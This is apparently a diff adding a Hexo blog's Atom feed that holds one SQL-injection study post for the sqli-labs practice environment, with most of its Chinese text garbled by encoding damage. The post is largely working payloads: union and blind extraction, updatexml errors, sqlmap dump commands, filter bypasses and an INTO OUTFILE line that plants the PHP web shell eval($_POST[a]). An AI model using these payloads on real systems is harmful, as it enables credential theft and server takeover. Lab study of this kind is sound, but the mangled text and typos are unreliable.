@@ -1,0 +1,206 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://odiws.github.io</id>
+    <title>Hexo • Posts by &#34;sqlע��&#34; tag</title>
+    <link href="http://odiws.github.io" />
+    <updated>2024-03-25T08:48:15.000Z</updated>
+    <category term="buuctf" />
+    <category term="system_file" />
+    <category term="sql文件读取" />
+    <category term="文件内无字符rce" />
+    <category term="文件上传" />
+    <category term="php绕过open_basedir设置" />
+    <category term="无字母rce" />
+    <category term="ctf" />
+    <category term="php原生类利用" />
+    <category term="php反序列化" />
+    <category term="md5()和sha1()对类进行hash 触发__toString方法" />
+    <category term="http" />
+    <category term="cms框架" />
+    <category term="python" />
+    <category term="mongodb注入" />
+    <category term="条件竞争：利用session.upload_progress" />
+    <category term="preg_match绕过" />
+    <category term="$_server query_string 绕过" />
+    <category term="$_request绕过" />
+    <category term="file_get_cotents绕过" />
+    <category term="sha1函数比较数组绕过" />
+    <category term="create_function运用" />
+    <category term="buuctf， 反序列化" />
+    <category term="regexp注入" />
+    <category term="ECB加密" />
+    <category term="php7 segment fault特性" />
+    <category term="json数据爬虫" />
+    <category term="phar反序列化" />
+    <category term="js" />
+    <category term="CRLF Injection" />
+    <category term="soap" />
+    <category term="pickle反序列化" />
+    <category term="thinkphpV6.0.0" />
+    <category term="buuctf， 伪随机数" />
+    <category term="zip加密" />
+    <category term="xxe" />
+    <category term="xml_upload" />
+    <category term="flask的session伪造" />
+    <category term="二次渲染" />
+    <category term="buuctf，Perl后端文件上传" />
+    <category term="buuctf，xxe漏洞" />
+    <category term="java" />
+    <category term="flask" />
+    <category term="ctf工具安装教程" />
+    <category term="sql注入" />
+    <category term="php绕过open_opedir设置" />
+    <category term="TOTP" />
+    <category term="rce" />
+    <category term="ssti" />
+    <category term="insert截断" />
+    <category term="xss攻击" />
+    <category term="c的预处理" />
+    <category term="图片类" />
+    <category term="爬虫" />
+    <category term="js原型链污染" />
+    <category term="反序列化字符串逃逸" />
+    <category term="sql injection" />
+    <category term="文件上传(头像上传)" />
+    <category term="session反序列化" />
+    <category term="ssrf" />
+    <category term="HTTP走私攻击" />
+    <category term="json数据unicode转码绕过" />
+    <category term="对sqlite的sql注入" />
+    <category term="未理解" />
+    <category term="命令执行" />
+    <category term="zip软链接" />
+    <category term="python_seed函数" />
+    <category term="session伪造" />
+    <category term="js-vm沙箱逃逸" />
+    <category term="willphp2.2" />
+    <category term="ssti-smarty3.1.39" />
+    <category term="./htaccess文件上传" />
+    <category term="php未解析" />
+    <category term="利用环境变量构造bash命令" />
+    <category term="利用.htaccess构成后门" />
+    <category term="通过php_value来设置preg_macth正则回溯次数" />
+    <category term="java反序列化" />
+    <category term="伪随机数" />
+    <category term="mysql" />
+    <category term="信息搜集（js，网络）" />
+    <category term="异或" />
+    <category term="密码爆破" />
+    <category term="sqlmap使用" />
+    <category term="SQL注入" />
+    <category term="文件包含" />
+    <category term="php伪协议" />
+    <category term="pearcmd文件包含" />
+    <category term="xpath注入" />
+    <category term="Padding oracle attack 与CBC翻转字节攻击" />
+    <category term="php" />
+    <category term="sql盲注" />
+    <category term="php7.4" />
+    <category term="FFI预处理" />
+    <category term="thinkphp3.2.4" />
+    <category term="jwt" />
+    <category term="sql二次注入" />
+    <category term="MD5碰撞" />
+    <category term="jwt密码爆破" />
+    <category term="cms" />
+    <category term="create_function()函数" />
+    <category term="sqlע��" />
+    <category term="jwt身份验证" />
+    <category term="rc4" />
+    <entry>
+        <id>http://odiws.github.io/2024/03/25/sql%E6%B3%A8%E5%85%A5/</id>
+        <title>sqli-labs��sqlע��ѧϰ�ʼ�</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/03/25/sql%E6%B3%A8%E5%85%A5/"/>
+        <content type="html">&lt;p&gt;���ϲ�ѯ��䣺 union select&lt;br&gt;
+������from oo_user where username=��root�� union select * from oo_user where username=��dsa��;&lt;br&gt;
+������Ҫ��ģ�root�� union select * from oo_user where username=��dsa&lt;br&gt;
+Sqlע��Ļ�������&lt;br&gt;
+1.�жϴ���������ֻ����ַ�������?id=1 and 1=2 —���������Ϣ�����֣�û�������ַ���&lt;br&gt;
+2.�����ݿ⣬�ȱպϣ�?id=-1������ʹ�á� union select 1,2,database() #&lt;br&gt;
+3.Ȼ����order by�鿴�ֶ�����?id=-1�� order by 3 #    --ȷ�Ϻ�Ҫ��#�Ż���%23&lt;br&gt;
+4.��ȡ���ݿ⼰����Ϣ��1-1’ union select 1, 2, group_concat (table_name) from information_schema.tables where table_schema=database () #  --ȷ�Ϻ�Ҫ��#�Ż���%23&lt;br&gt;
+5.?id=-1’ union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=“����”#&lt;br&gt;
+–�������ֶα���&lt;br&gt;
+5.-1�� union select �ֶ� from ���� #          --�������� ����һ��Ҫ��group_concat()���ܲ�ѯ��&lt;br&gt;
+1’union select group_concat(username),group_concat(password) from security.users #&lt;/p&gt;
+&lt;p&gt;Sqlmap��ʹ�ã���win+r ��cmd��&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzEuc3FsbWFwLnB5&#34;&gt;1.sqlmap.py&lt;/span&gt; -u ��http://localhost/Less-5/?id=1�� --current-db   (��ǰ�����ݿ�)&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzIuc3FsbWFwLnB5&#34;&gt;2.sqlmap.py&lt;/span&gt; -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xvY2FsaG9zdC9MZXNzLTUvP2lkPTE=&#34;&gt;http://localhost/Less-5/?id=1&lt;/span&gt; --level=5 --risk=3 dbs   ��web��php��mysql��apache�汾��&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzMuc3FsbWFwLnB5&#34;&gt;3.sqlmap.py&lt;/span&gt; -u “&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xvY2FsaG9zdC9MZXNzLTUvP2lkPTE=&#34;&gt;http://localhost/Less-5/?id=1&lt;/span&gt;” --level=5 --risk=3 --dbms=mysql -D “security” --tables �����ݿ�ı���&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzQuc3FsbWFwLnB5&#34;&gt;4.sqlmap.py&lt;/span&gt; -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xvY2FsaG9zdC9MZXNzLTUvP2lkPTE=&#34;&gt;http://localhost/Less-5/?id=1&lt;/span&gt; --level=5 --risk=3 --dsms=mysql -D “security” -T “users” --col   �������ݿ�����ֶ�����&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzUuc3FsbWFwLnB5&#34;&gt;5.sqlmap.py&lt;/span&gt; -u &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2xvY2FsaG9zdC9MZXNzLTUvP2lkPTE=&#34;&gt;http://localhost/Less-5/?id=1&lt;/span&gt; --level=5 --risk=3 --dsms=mysql -D “security” -T “users” -C “password,username” -dump   �������ݿ���е����ݣ�&lt;/p&gt;
+&lt;p&gt;����äע�������õĳ�����û�����ݻ��ԣ�������ȷ�н��������û���&lt;br&gt;
+���÷�ʽ:�����ж�������and��,����²⣨ä�£���&lt;br&gt;
+MID������MID(��dqwdad��,5,2)   -----���ַ����ĵ���λ��ʼ��ȡ����ȡ��λ�ַ���&lt;br&gt;
+Substr������MIDһ��&lt;br&gt;
+Left������left(��adwawdwa��,5);   -----�ӵ�һ���ַ���ʼ����ȡ����ַ���&lt;br&gt;
+ORD(��c��)��ASCII(��c��)��һ�������ã�����ת��ASCII��&lt;br&gt;
+�����ݿ⣨�ȳ��ȣ���������ƣ�&lt;br&gt;
+���ȣ�?id=1�� and length(database())=1 – qwe&lt;br&gt;
+���ƣ�?id=1�� and ascii(MID(database(),1,1))=���� – qwe&lt;br&gt;
+�����ݱ���������ƣ�&lt;br&gt;
+?id=1�� and ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 1,1))=114 – qwe&lt;br&gt;
+���ֶ���&lt;br&gt;
+?id=1�� select substr((select colomn_name from information_schema.colomns where table_schema=�����ݿ����� and table_name=�����ݱ����� limit 0,1),1,1)=114 – qwe&lt;br&gt;
+�����ݣ�?id=1�� select ORD(select IFNULL(username AS CHAR),0x20) from security .users ORDER BY id LIMIT 0,1),1,1))=68 – qwe&lt;/p&gt;
+&lt;p&gt;Updatexml:�﷨��updatexml(Ŀ��xml����,xml�ĵ�·��,���µ�����)&lt;br&gt;
+updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)&lt;/p&gt;
+&lt;p&gt;�жϿ�����&lt;br&gt;
+?id=1 &#39;�жϱ�����&lt;br&gt;
+?id=1 &#39;and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=‘security’ limit 3,1),0x7e),1) – qwe&lt;br&gt;
+�ж�������&lt;br&gt;
+?id=1 ’ and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=‘security’ and table_name=‘emails’ limit 0,1),0x7e),1) – qwe&lt;br&gt;
+ע�⣺table_name��=�����п���ð�Ų���ת����url���ԣ����Լ�ת��������=%27��&lt;br&gt;
+�ж����ݣ�&lt;br&gt;
+?id=1�� and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1) – qew&lt;/p&gt;
+&lt;p&gt;������sqlע��©�����ڣ���õľ���ͨ��mysql��fileϵ�к��������ж�ȡ�����ļ�����д��webshell�����бȽϳ��õĺ�����һ�¼�����&lt;br&gt;
+into dumpfile() д�뺯��&lt;br&gt;
+Into outfile()  д�뺯��&lt;br&gt;
+Load_file()&lt;br&gt;
+/ --б��һ������&lt;br&gt;
+\  --��б��Ҫ����&lt;br&gt;
+?id=1%27))%20union%20select%201,&amp;quot;&lt;?php%20eval($_POST[a]);?&gt;&amp;quot;,3%20INTO%20OUTFILE%20&amp;quot;C:/phpstudy_pro/WWW/sqli-labs-master/Less-7/shell.php������Ҫ�ŵ�·����&amp;quot;–%20qwe&lt;/p&gt;
+&lt;p&gt;����ʱ���äע��&lt;br&gt;
+�ж����ݿ�ĳ��ȣ�&lt;br&gt;
+?id=1%27and%20if(length((select%20database()))&amp;gt;1,sleep(5),1)–+&lt;br&gt;
+��������wampͼ��ʲôʱ����ʾ��&lt;br&gt;
+��һ�ж��ַ���&lt;br&gt;
+?id=1’and if(ascii(substr((select database()),1,1))=115,sleep(5),1)–+&lt;br&gt;
+�ж����б������ȣ�&lt;br&gt;
+?id=1’and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&amp;gt;13,sleep(5),1)–+&lt;br&gt;
+��һ�жϱ�����&lt;br&gt;
+?id=1’and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&amp;gt;99,sleep(5),1)–+&lt;/p&gt;
+&lt;p&gt;�ж������ֶ����ĳ��ȣ�&lt;br&gt;
+?id=1’and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘users’))&amp;gt;20,sleep(5),1)–+&lt;br&gt;
+��һ�ж��ֶ�����&lt;br&gt;
+?id=1’and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=‘users’),1,1))&amp;gt;99,sleep(5),1)–+&lt;br&gt;
+�ж��ֶ����ݳ���&lt;br&gt;
+?id=1’ and if(length((select group_concat(username,password) from users))&amp;gt;109,sleep(5),1)–+&lt;br&gt;
+��һ������ݣ�&lt;br&gt;
+?id=1’ and if(ascii(substr((select group_concat(username,password) from users),1,1))&amp;gt;50,sleep(5),1)–+&lt;/p&gt;
+&lt;p&gt;httpЭ�飺&lt;br&gt;
+ Useragentע��&lt;br&gt;
+Referrerע�룺&lt;br&gt;
+cookieע�룺setcookie (name,value,expire) name �涨 cookie������&lt;br&gt;
+Value �涨 cookie��ֵ expire �涨 cookie����Ч�ڡ�&lt;/p&gt;
+&lt;p&gt;����ѯ�����Ϳ������������ֶ�ֱ����������&lt;br&gt;
+Select * from (select * from users as a JOIN users as b using())c;&lt;/p&gt;
+&lt;p&gt;���滻�����дʣ�&lt;br&gt;
+and or : &amp;amp;&amp;amp; ||&lt;br&gt;
+Order by : group by&lt;br&gt;
+Union select : union all select ���� union /&lt;em&gt;!90000sd&lt;/em&gt;/ select&lt;br&gt;
+Information_schema.tables:sys.schema_table_statistics_with_buffer   ���� sys.x$ps_schema_table_statistics_io&lt;/p&gt;
+&lt;p&gt;uni union%0Aselecton%0Aselect%0A    ������union select ��һ�ַ�����sqli-labs28�أ�&lt;br&gt;
+ת\���ŵļ��㣺����\ǰ��% df��&lt;br&gt;
+?id=-1%df%27%20union%20select%201,group_concat(table_name),3%20from%20information_schema.tables%20where%20table_schema=database()–+&lt;br&gt;
+��?id=-1?’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()–&lt;br&gt;
+union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273–+             ��������һ��д��&lt;/p&gt;
+&lt;p&gt;1%df’ union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273–+  ���ֶ���&lt;/p&gt;
+&lt;p&gt;1%df’ union select 1,group_concat(password,username) from users–+ �������˻�              ���ֽ�ע�루������utf-8���ͣ�&lt;/p&gt;
+&lt;p&gt;�ѵ�ע�룺����ã�&lt;br&gt;
+��ǰ����ϱպ�;insert into users values(18,‘icepeak’,‘icepeak’)#&lt;/p&gt;
+</content>
+        <category term="sqlע��" />
+        <updated>2024-03-25T08:48:15.000Z</updated>
+    </entry>
+</feed>
